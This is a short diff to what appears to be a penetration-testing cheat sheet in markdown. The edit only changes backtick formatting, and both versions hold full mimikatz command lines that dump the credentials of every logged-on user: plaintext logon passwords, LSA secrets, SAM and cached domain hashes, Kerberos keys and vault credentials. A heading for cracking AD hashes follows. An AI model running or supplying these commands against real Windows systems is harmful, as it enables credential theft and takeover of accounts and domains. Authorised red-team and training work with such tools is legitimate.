@@ -1,9 +1,8 @@
 # Summary
 
-Dump the credentials of all connected users, including cached hashes
-`./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"`
-
-`./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"`
+`Dump the credentials of all connected users, including cached hashes`
+./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
 
 `Cracking Ad Hashes`
 
